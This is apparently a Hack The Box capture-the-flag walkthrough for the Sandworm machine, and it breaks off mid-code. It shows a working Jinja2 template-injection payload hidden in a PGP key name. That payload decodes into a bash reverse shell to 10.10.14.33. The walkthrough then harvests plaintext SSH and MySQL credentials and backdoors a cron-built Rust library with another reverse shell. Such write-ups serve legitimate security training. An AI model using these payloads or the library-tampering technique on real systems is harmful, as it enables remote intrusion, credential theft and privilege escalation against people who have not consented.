<details>
<summary>Recon</summary>

<details>
<summary>Recon - nmap</summary>

To begin the reconnaissance process, we can initiate an Nmap scan on the target system. Considering that this is a Hack The Box system and not a production environment, we don't need to prioritize minimizing detectability or limiting the impact on the target system. Therefore, we can run the Nmap scan without concern for stealthy scanning techniques.
```Bash
nmap -sSCV -p- --min-rate=5000 10.129.182.254
```

```
Nmap scan report for 10.129.182.254
Host is up (0.047s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

To facilitate access to the hostname mentioned (`ssa.htb`), we can add an entry for it in the `/etc/hosts` file on our local machine. This will allow us to easily reference the hostname without relying on DNS resolution.
</details>

<details>
<summary>Recon - gobuster</summary>

While exploring the application, we see that port 80 redirects to HTTPS. Since the certificate being used is self-signed, we may encounter certificate verification errors. To bypass these errors, we can utilize the `-k` flag with the `gobuster dir` command. This flag instructs gobuster to skip TLS certificate verification and proceed with the directory enumeration.

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://ssa.htb -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://ssa.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/06/28 12:10:00 Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 5584]
/admin                (Status: 302) [Size: 227] [--> /login?next=%2Fadmin]
/contact              (Status: 200) [Size: 3543]                          
/guide                (Status: 200) [Size: 9043]                          
/login                (Status: 200) [Size: 4392]                          
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/pgp                  (Status: 200) [Size: 3187]                           
/process              (Status: 405) [Size: 153]                            
/view                 (Status: 302) [Size: 225] [--> /login?next=%2Fview]  
                                                                           
===============================================================
2023/06/28 12:10:26 Finished
===============================================================
```
</details>
</details>

<details>
<summary>Path to Foothold</summary>

While exploring the enumerated directories, we see a PGP key and its association with the `/guide` page. The presence of a PGP key suggests that the path to a foothold might involve PGP keys and related functionalities.

<details>
<summary>Server Side Template Injections</summary>

<details>
<summary>Server Side Template Injections: Reading</summary>

At the bottom of the page, it is mentioned that the site is `powered by Flask`. If we conduct a Google search for "`hacktricks Flask`," one of the top results is a GitHub page:   
[hacktricks/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md)

This page provides information about `server-side template injection` (`SSTI`) with `Jinja2`, which suggests that *the application might be susceptible to `SSTI` vulnerabilities.*

`Jinja2` is a widely used `template engine` in conjunction with `Flask`.

For further exploration and testing, `PayloadsAllTheThings` provides a comprehensive collection of payloads and techniques for various programming languages and their associated template engines. This resource offers a range of payloads that can be utilized to assess and potentially exploit vulnerabilities.  
[PayloadsAllTheThings: Server Side Template Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)  

While the presence of `Flask` suggests the possibility of server-side templates being used, it does not guarantee the existence of a `server-side template injection` vulnerability. `Server-side template injection vulnerabilities` can occur in various web frameworks, including `Flask`, but their presence cannot be solely determined based on the framework being used.

To identify a `server-side template injection` vulnerability, it is necessary to perform thorough testing and analysis, including injecting payloads and analyzing the response.  
[Portswigger Writeup on SSTI](https://portswigger.net/web-security/server-side-template-injection)  
[Portswigger Research on SSTI](https://portswigger.net/research/server-side-template-injection)  
[Portswigger Practice SSTI](https://portswigger.net/web-security/all-labs#server-side-template-injection)

</details>

<details>
<summary>scripts.js</summary>

Within the `/guide` page, there are references to both minified JavaScript files and an unminified `scripts.js` file. The presence of the custom `scripts.js` file suggests that it is specifically developed for this application.

Upon inspection, we see the JavaScript code is responsible for handling form submissions using the POST method to the `/process` endpoint. Although we do not have direct access to the server-side code processing the input, this functionality implies that there is server-side code involved in the processing of the submitted data. Server-side processing of input does sound like we could potentially inject code here.

In the code snippet below, we can observe that the data being transmitted includes the parameters "`signed_text`" and "`public_key`," which are utilized in conjunction with the "`Verify Signature`" button.

``` javascript
$(function () {
    $('[data-toggle="tooltip"]').tooltip()
  });

$(document).ready(function() {
    $(".verify-form").submit(function(e) {
      e.preventDefault();
      var signed_text = $("#signed_text").val();
      var public_key = $("#public_key").val();
      $.ajax({
        type: "POST",
        url: "/process",
        data: { signed_text: signed_text, public_key: public_key },
        success: function(result) {
          $("#signature-result").html(result);
          $("#signature-modal").modal("show");
        }
      });
    });
	    $("#signature-modal .btn-secondary").click(function() {
      $("#signature-modal").modal("hide");
    });
  });
```
</details>
</details>

<details>
<summary>Server Side Template Injections: GPG Payload Process</summary>

When generating a `PGP` key, there are typically two fields that can be manipulated: the name and the email address. Our initial focus will be on the name field. To identify any potential `Server-Side Template Injection` (`SSTI`) vulnerability within this specific application, we can utilize "`PayloadsAllTheThings`" as a resource for discovering a basic Jinja2 injection. 

[PayloadsAllTheThings: Server Side Template Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) 

You can input the following code snippet as the "Name" field during the creation of a `PGP` key for testing purposes: 
```Python
{{4*4}}
```
</details>
<details>
<summary>Generate PGP key</summary>

```bash
gpg --gen-key
Real name: {{4*4}}
Email address: a@a.net
You selected this USER-ID:
    "{{4*4}} <a@a.net>"
```
Enter O for okay

To facilitate the testing process, you can enter a password for authentication purposes. While it is generally considered a poor practice to use a simple password like "password," we can overlook this concern for the purpose of testing against this system.

```bash
gpg: key 020AEF7A1D6044A3 marked as ultimately trusted
gpg: revocation certificate stored as '/home/user/.gnupg/openpgp-revocs.d/55CF50DBBD82991B17B5C027020AEF7A1D6044A3.rev'
public and secret key created and signed.

pub   rsa3072 2023-06-30 [SC] [expires: 2025-06-29]
      55CF50DBBD82991B17B5C027020AEF7A1D6044A3
uid                      {{4*4}} <a@a.net>
sub   rsa3072 2023-06-30 [E] [expires: 2025-06-29]
```
</details>

<details>
<summary>Export PGP key</summary>

To export a copy of your `public key`, you can use the following command, ensuring that you replace the `key id` with the actual id of your key.

```Bash
gpg --export -a 020AEF7A1D6044A3

-----BEGIN PGP PUBLIC KEY BLOCK-----

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
NqaQVamMzMHM
=psZn
-----END PGP PUBLIC KEY BLOCK-----
```
</details>

<details>
<summary>Sign message</summary>

There are various methods available for signing a message, but in the context of this exercise, we can accomplish it by using the `echo` command. In this example, we utilize a `pipeline` to redirect the output from `echo` as input to the `gpg` function. We specify the operation as `sign` and indicate the usage of `ASCII armoring` to facilitate processing. By employing `ASCII armoring`, the resulting data is encoded in `base64` format instead of the typical `base16` (`hexadecimal`) representation. Additionally, we include the specification of a `local user key`, which becomes necessary when there are multiple `private keys` present in the `keyring`. It is important to note that the `0x` prefix is included before the `long-format key ID` to denote its representation in `hexadecimal` format. This convention is particularly useful when managing keys, as it enables easy deletion based on the `key IDs`, which can be more straightforward than attempting to identify and delete a key based on the `payload` stored within the key's `name`.

```bash
echo 'henlo ssa' | gpg --sign --armor --local-user 0x020AEF7A1D6044A3
-----BEGIN PGP MESSAGE-----

owEB1wEo/pANAwAKAQIK73odYESjAcsQYgBknm5kaGVubG8gc3NhCokBswQAAQoA
HRYhBFXPUNu9gpkbF7XAJwIK73odYESjBQJknm5kAAoJEAIK73odYESjvIcMAM73
K6g3qRGl3048UnHt+hqcQ3Xebmqhf+HyVEsXZdXVFpzGDakdvNdoIylt55qmtELr
1Y/ZM54Kh3KSjawu6pBKed5LisS45nsRpQisXBz4bNlcMrzZVMiHP5SHZNWV9PkO
MduiD578YqfblEy/gQQXglQzOmw8Z/dD3oFS2zfDIHWYhrRqXtZ8AH1l1MnH/2vJ
BXunlZvBhxV2/SszVye0fCLTDimU3rbSU6N5R4pNyL3xvksIb3lSXVzkT+oqmCl8
x6QCfjPac8zmDAb7DG9thKeY3NR4glgE29JpCEwtQf7T6qeQjPOQ09+M/c98uBJU
pvDlkDmgA8ZC6aFVYT/+Dr9HKZBTGeHOVSV2EPgps7Yz4tNCqQb92r4vqwXEe9vD
r7ZuUtkr85lqZePBm9QzX4hu4QlPpWVfgcCEdLf3C0YXh4Rqd6YXTvtGsoBPU/CO
3UKDNgbAP1To0SQibQWjNlGAydVgym8KPe/lnw2Xr98g+Ugeg0xvndIpxobWMw==
=IxZK
-----END PGP MESSAGE-----
```
</details>

<details>
<summary>Testing our payload</summary>

In order to test our payload, we need to submit our public key and this message.

If submitted properly, we should see the following response indicating a positive result for SSTI vulnerability.

Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Fri 30 Jun 2023 05:55:48 AM UTC gpg: using RSA key 55CF50DBBD82991B17B5C027020AEF7A1D6044A3 [GNUPG:] KEY_CONSIDERED 55CF50DBBD82991B17B5C027020AEF7A1D6044A3 0 [GNUPG:] SIG_ID NnPgkibdtPZKDI92OOw9QOrtDYI 2023-06-30 1688104548 [GNUPG:] KEY_CONSIDERED 55CF50DBBD82991B17B5C027020AEF7A1D6044A3 0 [GNUPG:] GOODSIG 020AEF7A1D6044A3 16 gpg: `Good signature from "16 "` [unknown] [GNUPG:] VALIDSIG 55CF50DBBD82991B17B5C027020AEF7A1D6044A3 2023-06-30 1688104548 0 4 0 1 10 00 55CF50DBBD82991B17B5C027020AEF7A1D6044A3 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: 55CF 50DB BD82 991B 17B5 C027 020A EF7A 1D60 44A3
</details>

<details>
<summary>Payload to Foothold</summary>

With the confirmation of the web server's vulnerability, we can now focus on crafting a robust payload to establish our initial foothold.

[Exploit Notes: Jinja2 Pentesting](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/)  
Exploit Notes served as a valuable resource by providing the payload template I utilized to establish a foothold.

To successfully execute our reverse shell, we must employ a multi-layered payload and encode it using Base64. This encoding ensures that the payload can be decoded and executed seamlessly within the server's processing pipeline.

```Bash
echo 'bash -c \"bash -i >& /dev/tcp/10.10.14.33/1337 0>&1\"' | base64
```
The base64 output is `YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMy8xMzM3IDA+JjEiCg==`  
So, to use this we need to add it in the quotes of our echo command inside the payload below.

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMy8xMzM3IDA+JjEiCg==" | base64 -d | bash').read() }}
```

Now that we have our `payload`, the next steps involve generating a new `PGP` key with the payload as the `Name` value, exporting the corresponding `public key`, `signing` an arbitrary message, and `verifying` it on the `/guide` page. Before proceeding with the `verification`, it is crucial to configure a `netcat listener` on the chosen `port` to ensure proper communication.

If all goes well, you should be seeing a connection to your listener as `atlas@sandworm` instead of `www-data`.
</details>
</details>

<details>
<summary>Foothold to User</summary>

```bash
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
```

I was able to `cat` the `/etc/passwd` and see atlas can be logged into via ssh.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
silentobserver:x:1001:1001::/home/silentobserver:/bin/bash
atlas:x:1000:1000::/home/atlas:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

While exploring the files and directories, one being `~/.config/firejail` which hints that we may be in a `sandbox`. 

> `Firejail` is a `SUID sandbox` program that reduces the risk of security breaches by `restricting the running environment of untrusted applications` using Linux namespaces, seccomp-bpf and Linux capabilities. It allows a process and all its descendants to have their own private view of the globally shared kernel resources, such as the network stack, process table, mount table. - [Github: Firejail](https://github.com/netblue30/firejail)

I was unable to unable to add my `ssh key` as a `persistance` technique due to being restricted by the `firejail sandbox`, read-only file system. I cannot check the version of `firejail`, and I cannot check for `SUID binaries` at this time either.

 You should eventually find a specific file that contains hardcoded credentials. I noticed the absence of a `user.txt` file in the `home` directory, which prompted me to search for additional clues. During this process, I came across the presence of `httpie` in the `.config` directory, which piqued my interest as I was unfamiliar with it. As I continued digging, I located the file mentioned below. To gather more information, I conducted a quick online search and discovered that `httpie` is an `API testing client`.  

Upon testing the `username` and `password` as `SSH` credentials, I was able to log in and find the `user.txt` file in the `home` directory belonging to `silentobserver`.

```Bash
cat ~/.config/httpie/sessions/localhost_5000/admin.json
```

```JSON
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```
</details>

<details>
<summary>Silentobserver back to Atlas</summary>

<details>
<summary>SUID Binaries</summary>

```bash
id
uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
```

Checking `sudo -l` informed us `silentobserver` may not run `sudo` on `localhost`.

 I still can't determine the version of `firejail`, and I can't use `cp` in the `sandbox` as `atlas` to try to get my `ssh key` set up as a `backdoor`. I googled and found a `suid bit priv esc` [exploit](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25) for `firejail` as well as an [escape](https://www.exploit-db.com/exploits/43359) `exploit`. However, the escape method seems outdated, and there is a risk of potentially bricking the virtual machine. Considering these factors, I've decided to postpone attempting the escape and avoid the need to reset the machine.

 There is no `cron jobs` listed for `silentobserver`, and only routine `cron jobs` in `/etc/crontab`

 Checking for `SUID binaries` shows some interesting binaries in the `/opt` directory, some files are being ran with `atlas`'s permissions. I would expect the `firejail` to be around the `webapp`, but not these so I am going to look into these to see if they could be a path foward.

While I explore these options, I'm going to get `pspy64` onto this machine and start monitoring processes.
```bash
find / -type f -perm /4000 -exec ls -la {} \; 2>/dev/null

-rwsrwxr-x 2 atlas atlas 59047248 Jun 30 19:00 /opt/tipnet/target/debug/tipnet
-rwsrwxr-x 1 atlas atlas 56234960 May  4 18:06 /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
-rwsrwxr-x 2 atlas atlas 59047248 Jun 30 19:00 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
-rwsr-xr-- 1 root messagebus 35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 338536 Nov 23  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-x 1 root root 47480 Feb 21  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 232416 Apr  3 18:00 /usr/bin/sudo
-rwsr-xr-x 1 root root 72072 Nov 24  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 35192 Feb 21  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 59976 Nov 24  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 44808 Nov 24  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 72712 Nov 24  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 40496 Nov 24  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55672 Feb 21  2022 /usr/bin/su
-rwsr-xr-x 1 root root 35200 Mar 23  2022 /usr/bin/fusermount3
```
</details>

<details>
<summary>Enumerating the path foward</summary>

`pspy64` shows `root` has been very active. We see in 2 minute intervals:
- root running `cron jobs`
- root using `sudo` to run `cargo` while restricting it to not have network access
  - This program is a package manager and build tool for the `Rust` language.
- root changing directories to `/opt/tipnet` before running `cargo` as `atlas` while passing the character "`e`" to it
- root uses `cron -f -p` to stay in foreground mode rather than daemonizing and not to set PATH for child processes so it can inherit instead.
- root then sleeps for 10 seconds
- root then uses `sudo` to run `cargo` as `atlas` again, without networking.
- `atlas` then uses `rustc -vV` to be verbose and print the versions of rust, the host architecture, and the version of LLVM that is being used.
- `atlas` then appears to `compile` an unspecified crate, implied as from the `/opt/tipnet` directory
- root removes `/opt/crates`
- root then runs `/root/Cleanup/clean_c.sh`
- root runs `chmod u+s /opt/tipnet/target/debug/tipnet`
- bonus on the hour is confirming the `firejail` for the `webapp` running as `atlas` but nothing else.

```bash
2023/06/30 23:30:01 CMD: UID=0     PID=40480  | /usr/sbin/CRON -f -P 
2023/06/30 23:30:01 CMD: UID=0     PID=40487  | 
2023/06/30 23:30:01 CMD: UID=0     PID=40489  | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/06/30 23:30:01 CMD: UID=0     PID=40488  | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/06/30 23:30:01 CMD: UID=0     PID=40490  | /usr/sbin/CRON -f -P 
2023/06/30 23:30:01 CMD: UID=0     PID=40491  | sleep 10 
2023/06/30 23:30:01 CMD: UID=0     PID=40492  | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/06/30 23:30:01 CMD: UID=1000  PID=40493  | rustc -vV 
2023/06/30 23:30:01 CMD: UID=1000  PID=40494  | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed 
2023/06/30 23:30:01 CMD: UID=1000  PID=40496  | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg 
2023/06/30 23:30:01 CMD: UID=1000  PID=40498  | rustc -vV 
2023/06/30 23:30:11 CMD: UID=0     PID=40503  | /bin/rm -r /opt/crates 
2023/06/30 23:30:11 CMD: UID=0     PID=40502  | /bin/bash /root/Cleanup/clean_c.sh 
2023/06/30 23:30:11 CMD: UID=0     PID=40504  | /bin/bash /root/Cleanup/clean_c.sh 
2023/06/30 23:30:11 CMD: UID=0     PID=40505  | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet 

2023/07/01 00:00:01 CMD: UID=0     PID=40992  | /bin/cp -p /root/Cleanup/webapp.profile /home/atlas/.config/firejail/ 
```

</details>

<details>
<summary>Rusty Rabbit Hole: hardcoded credentials in main.rs</summary>

Digging into the first `SUID` running as `atlas`, we find the binary named `tipnet` and a makefile-compatible dependency list file named `tipnet.d`.

```bash
ls -lah /opt/tipnet/target/debug/
drwxrwxr-x   7 root  atlas 4.0K Jun 30 19:00 .
drwxr-xr-x   3 root  atlas 4.0K Jun  6 11:49 ..
drwxrwxr-x 142 atlas atlas  12K Jun  6 11:49 build
-rwxrwxr--   1 root  atlas    0 Feb  8 09:10 .cargo-lock
drwxrwxr-x   2 atlas atlas  68K Jun 30 19:00 deps
drwxrwxr-x   2 atlas atlas 4.0K Jun  6 11:49 examples
drwxrwxr-- 472 root  atlas  24K Jun  6 11:49 .fingerprint
drwxrwxr-x   6 atlas atlas 4.0K Jun  6 11:49 incremental
-rwsrwxr-x   2 atlas atlas  57M Jun 30 19:00 tipnet
-rw-rw-r--   1 atlas atlas   87 May  4 17:24 tipnet.d
```

```bash
cat /opt/tipnet/target/debug/tipnet.d

/opt/tipnet/target/debug/tipnet: /opt/crates/logger/src/lib.rs /opt/tipnet/src/main.rs

ls -lah  /opt/tipnet/src/main.rs
-rwxr-xr-- 1 root atlas 5.7K May  4 16:55 /opt/tipnet/src/main.rs

ls -lah /opt/crates/logger/src/lib.rs 
-rw-rw-r-- 1 atlas silentobserver 732 May  4 17:12 /opt/crates/logger/src/lib.rs
```

As seen above, we have read access to `main.rs` and write access to `lib.rs`

Upon reading `main.rs` we find `hardcoded credentials` for a mysql database. This turns out to be a `rabbit hole` as we can connect to the database but we do not have read permissions to the database.

```Rust
fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}
```
</details>

<details>
<summary>Lateral pivoting via lib.rs</summary>
Since we have write access to `lib.rs`, we should try adding in our own code as a `reverse shell` to see if we can get unjailed as `atlas`.

We have a short amount of time before lib.rs is wiped, so today we use `vim`.  
Upon changing directories into `/opt/crates/logger/src` `lib.rs` is created.

Prior to modifying lib.rs, set up your netcat listener to your chosen port to make sure it is listening before our code is executed.

To be fast about this, wait until lib.rs is deleted, then do the following.
```
cd .. && cd src && vim lib.rs
```
Once in vim enter `:%d` followed by `ctrl+shift+v` followed by `:wq!`

Before
```Rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}

```
After

```Rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::{Command, Stdio};

pub fn log(user: &str, query: &str, justification: &str) {
    let command = "bash -i >& /dev/tcp/10.10.14.33/1337 0>&1";

    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .output()
        .expect("Failed to execute reverse shell command.");

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        println!("Standard output: {}", stdout);
        println!("Error output: {}", stderr);
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        eprintln!("Error: {}", stderr);
    }

    let now = Local::now();
